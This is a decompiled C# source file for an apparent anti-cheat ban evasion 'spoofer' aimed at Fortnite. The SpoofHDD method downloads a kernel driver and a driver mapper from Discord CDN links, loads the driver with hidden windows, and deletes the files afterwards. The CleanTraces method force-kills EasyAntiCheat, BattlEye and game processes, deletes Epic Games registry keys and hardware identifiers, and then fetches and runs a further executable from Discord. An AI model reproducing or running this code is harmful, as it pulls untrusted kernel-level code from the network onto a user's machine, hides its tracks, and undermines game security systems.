using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Security.Principal;
using System.Threading;

namespace Your_First_Pasted_Spoofer
{
	// Token: 0x02000004 RID: 4
	internal class Spoof
	{
		// Token: 0x06000008 RID: 8 RVA: 0x000021F4 File Offset: 0x000003F4
		public static void SpoofHDD()
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\mapper.exe";
			string text2 = "C:\\Windows\\IME\\spoof.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1133777414208618517/1135014077698158643/Woofer.sys", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1133777414208618517/1135016479880921128/mapper.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process process2 = Process.Start(text, text2);
			Thread.Sleep(1000);
			process2.Close();
			File.Delete(text2);
			File.Delete(text);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002284 File Offset: 0x00000484
		public static void CleanTraces(string loc)
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
			process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
			process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + Spoof.SIDCleaner + "\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("exit");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\cleaner.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/670374247335591944/670404644807114752/Caught.Power.exe", text);
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd.exe";
			process2.StartInfo.RedirectStandardInput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = false;
			process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process2.Start();
			Thread.Sleep(1000);
			process2.StandardInput.WriteLine(loc ?? "");
			Thread.Sleep(15000);
			File.Delete(text);
		}

		// Token: 0x04000002 RID: 2
		private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;
	}
}
